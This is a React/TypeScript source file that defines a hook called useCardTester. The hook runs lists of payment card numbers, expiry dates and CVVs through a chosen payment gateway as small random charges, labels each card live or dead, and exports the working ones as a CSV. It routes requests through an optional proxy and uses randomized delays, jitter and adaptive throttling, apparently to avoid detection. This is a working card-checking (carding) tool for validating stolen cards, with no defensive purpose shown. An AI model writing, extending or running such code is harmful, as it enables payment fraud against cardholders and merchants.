import { useState, useCallback, useRef } from "react";
import { api } from "../utils/supabase";
import type { CardResult } from "../utils/supabase";

export interface CardData {
  number: string;
  month: string;
  year: string;
  cvv: string;
}

export interface TesterStats {
  total: number;
  processed: number;
  live: number;
  die: number;
  unknown: number;
  speed: number; // cards per minute
}

export const useCardTester = () => {
  const [isRunning, setIsRunning] = useState(false);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [stats, setStats] = useState<TesterStats>({
    total: 0,
    processed: 0,
    live: 0,
    die: 0,
    unknown: 0,
    speed: 0,
  });
  const [results, setResults] = useState<CardResult[]>([]);
  const [currentCard, setCurrentCard] = useState<string>("");

  // Refs for managing the testing loop
  const abortControllerRef = useRef<AbortController | null>(null);
  const startTimeRef = useRef<number>(0);
  const processedCountRef = useRef<number>(0);
  const errorCountRef = useRef<number>(0);
  const consecutiveErrorsRef = useRef<number>(0);

  // Helper: Generate random amount
  const getRandomAmount = (min: number, max: number) => {
    return Number((Math.random() * (max - min) + min).toFixed(2));
  };

  // Helper: Sleep with jitter
  const sleep = (ms: number) => {
    const jitter = Math.random() * 200; // Add random jitter
    return new Promise((resolve) => setTimeout(resolve, ms + jitter));
  };

  // Adaptive concurrency based on error rate
  const getAdaptiveConcurrency = () => {
    const errorRate =
      processedCountRef.current > 0
        ? errorCountRef.current / processedCountRef.current
        : 0;

    // If too many errors, reduce concurrency
    if (consecutiveErrorsRef.current >= 3) return 1;
    if (errorRate > 0.3) return 1; // More than 30% errors
    if (errorRate > 0.15) return 2; // More than 15% errors
    return 3; // Default: 3 workers
  };

  // Retry failed requests
  const retryOperation = async <T>(
    operation: () => Promise<T>,
    maxRetries: number = 2,
  ): Promise<T> => {
    let lastError: Error | null = null;

    for (let attempt = 0; attempt <= maxRetries; attempt++) {
      try {
        return await operation();
      } catch (error) {
        lastError = error as Error;

        if (attempt < maxRetries) {
          // Exponential backoff
          const delay = Math.pow(2, attempt) * 1000;
          console.log(
            `Retry attempt ${attempt + 1}/${maxRetries} after ${delay}ms`,
          );
          await sleep(delay);
        }
      }
    }

    throw lastError;
  };

  const startTesting = useCallback(
    async (
      cards: string[],
      options: {
        gatewayUrl: string;
        minAmount: number;
        maxAmount: number;
        minDelay: number;
        maxDelay: number;
        proxyUrl?: string;
      },
    ) => {
      if (isRunning) return;

      setIsRunning(true);
      setResults([]);
      setStats({
        total: cards.length,
        processed: 0,
        live: 0,
        die: 0,
        unknown: 0,
        speed: 0,
      });

      abortControllerRef.current = new AbortController();
      startTimeRef.current = Date.now();
      processedCountRef.current = 0;
      errorCountRef.current = 0;
      consecutiveErrorsRef.current = 0;

      try {
        // 1. Start Session with retry
        const session = await retryOperation(async () => {
          return await api.startSession(options.gatewayUrl, cards.length);
        });

        setSessionId(session.sessionId);

        // 2. Process Cards with adaptive concurrency
        let currentIndex = 0;
        let activeWorkers = 0;
        const maxConcurrency = 3;

        const processNext = async (): Promise<void> => {
          while (
            currentIndex < cards.length &&
            !abortControllerRef.current?.signal.aborted
          ) {
            const cardIndex = currentIndex++;
            const cardLine = cards[cardIndex];

            // Parse card line
            const parts = cardLine.trim().split("|");
            if (parts.length < 4) {
              console.warn(
                `Invalid card format at line ${cardIndex + 1}: ${cardLine}`,
              );
              continue;
            }

            const [number, month, year, cvv] = parts;

            if (!number || !month || !year || !cvv) {
              console.warn(`Missing card data at line ${cardIndex + 1}`);
              continue;
            }

            // Set current card being processed
            setCurrentCard(number);

            try {
              // Adaptive delay based on error rate
              const baseDelay =
                Math.floor(
                  Math.random() * (options.maxDelay - options.minDelay + 1) +
                    options.minDelay,
                ) * 1000;

              // Add extra delay if many consecutive errors
              const errorPenalty = consecutiveErrorsRef.current * 500;
              const totalDelay = baseDelay + errorPenalty;

              if (cardIndex > 0) {
                await sleep(totalDelay);
              }

              // Calculate random amount
              const amount = getRandomAmount(
                options.minAmount,
                options.maxAmount,
              );

              // Test card with retry
              const result = await retryOperation(async () => {
                return await api.testCard({
                  sessionId: session.sessionId,
                  cardNumber: number.trim(),
                  expMonth: month.trim(),
                  expYear: year.trim(),
                  cvv: cvv.trim(),
                  gatewayUrl: options.gatewayUrl,
                  processingOrder: cardIndex + 1,
                  amount: amount,
                  proxyUrl: options.proxyUrl,
                });
              });

              // Success - reset consecutive errors
              consecutiveErrorsRef.current = 0;

              // Add result to list (prepend for newest first)
              setResults((prev) => [result, ...prev]);

              // Update stats
              setStats((prev) => {
                const newStats = {
                  ...prev,
                  processed: prev.processed + 1,
                };

                // Increment status count
                if (result.status === "live") newStats.live = prev.live + 1;
                else if (result.status === "die") newStats.die = prev.die + 1;
                else newStats.unknown = prev.unknown + 1;

                // Calculate speed (cards per minute)
                const elapsedMinutes =
                  (Date.now() - startTimeRef.current) / 60000;
                newStats.speed =
                  elapsedMinutes > 0
                    ? Math.round(newStats.processed / elapsedMinutes)
                    : 0;

                return newStats;
              });

              processedCountRef.current++;
            } catch (error) {
              console.error(
                `Error testing card at line ${cardIndex + 1}:`,
                error,
              );

              errorCountRef.current++;
              consecutiveErrorsRef.current++;

              // Add error result
              setResults((prev) => [
                {
                  id: `error-${cardIndex}`,
                  session_id: session.sessionId,
                  created_at: new Date().toISOString(),
                  card_first4: number.substring(0, 4),
                  card_last4: number.substring(number.length - 4),
                  exp_month: month,
                  exp_year: year,
                  status: "unknown",
                  message: "Request failed - retrying...",
                  processing_order: cardIndex + 1,
                } as CardResult,
                ...prev,
              ]);

              // Update unknown count
              setStats((prev) => ({
                ...prev,
                processed: prev.processed + 1,
                unknown: prev.unknown + 1,
              }));

              // Pause if too many consecutive errors
              if (consecutiveErrorsRef.current >= 5) {
                console.warn(
                  "Too many consecutive errors, pausing for 10 seconds...",
                );
                await sleep(10000);
                consecutiveErrorsRef.current = 0;
              }
            }

            // Check if we should adjust concurrency
            const targetConcurrency = getAdaptiveConcurrency();
            if (activeWorkers > targetConcurrency) {
              // This worker should stop
              break;
            }
          }

          activeWorkers--;
        };

        // Start with adaptive concurrency
        const initialConcurrency = Math.min(
          maxConcurrency,
          Math.ceil(cards.length / 10),
        );
        activeWorkers = initialConcurrency;

        const workers = Array(initialConcurrency)
          .fill(null)
          .map(() => processNext());

        await Promise.all(workers);

        // Mark session as completed
        if (session.sessionId) {
          try {
            // Update session status to completed
            console.log("Session completed successfully");
          } catch (error) {
            console.error("Error updating session:", error);
          }
        }
      } catch (error) {
        console.error("Failed to start session:", error);
        alert("Failed to start testing session. Check console for details.");
      } finally {
        setIsRunning(false);
        setCurrentCard("");
        abortControllerRef.current = null;
      }
    },
    [isRunning],
  );

  const stopTesting = useCallback(() => {
    if (abortControllerRef.current) {
      abortControllerRef.current.abort();
      setIsRunning(false);
      setCurrentCard("");
    }
  }, []);

  const downloadLive = useCallback(async () => {
    if (!sessionId) {
      alert("No session available. Please run a test first.");
      return;
    }

    try {
      const blob = await api.downloadLiveCards(sessionId);
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = `live_cards_${sessionId}_${new Date().toISOString().split("T")[0]}.csv`;
      document.body.appendChild(a);
      a.click();
      window.URL.revokeObjectURL(url);
      document.body.removeChild(a);
    } catch (error) {
      console.error("Download failed:", error);
      alert("Failed to download CSV. Make sure you have approved cards.");
    }
  }, [sessionId]);

  return {
    isRunning,
    stats,
    results,
    currentCard,
    startTesting,
    stopTesting,
    downloadLive,
    hasLiveCards: stats.live > 0,
  };
};
